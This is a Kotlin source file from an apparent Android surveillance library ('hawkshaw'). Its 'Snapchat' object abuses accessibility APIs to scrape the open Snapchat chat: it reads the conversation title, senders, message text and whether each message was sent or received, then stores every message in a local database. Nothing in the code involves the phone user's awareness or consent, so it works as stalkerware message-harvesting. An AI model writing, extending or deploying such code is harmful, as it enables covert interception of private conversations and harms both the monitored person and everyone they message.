package com.hawkshaw.library.features.accessibility.socialmedia

import android.graphics.Rect
import android.os.Build
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst // Import the extension function
import com.hawkshaw.library.ktextensions.getDp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.time.Clock
import java.util.concurrent.ExecutorService

/**
 * Object responsible for extracting Snapchat messages from accessibility events
 */
object Snapchat {
    private const val SNAPCHAT_ID = "com.snapchat.android:id"
    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    /**
     * Extracts and processes Snapchat messages from the provided accessibility node
     *
     * @param node The accessibility node containing Snapchat message information
     * @param executor The executor service for handling background tasks (Note: executor is not directly used here, coroutineScope is)
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractMessages(node: AccessibilityNodeInfo, executor: ExecutorService) { // ExecutorService parameter is unused in this method currently.
        // FIXED: Call findFirst as an extension function on 'node'
        val titleNode = node.findFirst("$SNAPCHAT_ID/conversation_title_text_view")
        val title = titleNode?.text ?: return

        // FIXED: Call findFirst as an extension function on 'node'
        val messageListNode = node.findFirst("$SNAPCHAT_ID/chat_message_list") ?: return
        val childCount = messageListNode.childCount

        for (i in 0 until childCount) {
            val child = messageListNode.getChild(i) ?: continue

            // Extract sender name
            // FIXED: Call findFirst as an extension function on 'child'
            val senderNode = child.findFirst("$SNAPCHAT_ID/sender")
            val sender = getEmpty(senderNode?.getChild(0)?.text)

            // Extract timestamp
            // FIXED: Call findFirst as an extension function on 'child'
            val timestampNode = child.findFirst("$SNAPCHAT_ID/timestamp")
            val timestamp = getEmpty(timestampNode?.getChild(0)?.text)

            // Extract message content
            // FIXED: Call findFirst as an extension function on 'child'
            val contentContainerNode = child.findFirst("$SNAPCHAT_ID/chat_message_content_container")
            val messageNode = contentContainerNode?.getChild(0)?.getChild(0)?.getChild(0)
            val messageText = messageNode?.text ?: continue
            val message = getEmpty(messageText)

            // Determine message type based on position
            val rect = Rect()
            messageNode.getBoundsInScreen(rect)
            val messageType = if (getDp(rect.left) < 65) {
                SocialMediaEntity.Type.Received
            } else {
                SocialMediaEntity.Type.Sent
            }

            // Create a unique identifier for this message (currently unused 'identifier' variable)
            val identifier = "$title-$message-$timestamp-${PackageName.SNAPCHAT}"

            // Create and save entity
            val entity = SocialMediaEntity(
                type = messageType,
                packageName = PackageName.SNAPCHAT.name,
                sender = sender,
                message = message,
                timestamp = Clock.systemDefaultZone().millis() // Using current time as timestamp
            )

            coroutineScope.launch {
                AppDatabaseKt.db.socialMediaDao().insert(entity)
            }
        }
    }

    /**
     * Returns an empty string if the CharSequence is null or empty
     *
     * @param charSequence The CharSequence to check
     * @return An empty string if null or empty, otherwise its string representation
     */
    private fun getEmpty(charSequence: CharSequence?): String {
        return if (charSequence.isNullOrEmpty()) "" else charSequence.toString()
    }
}
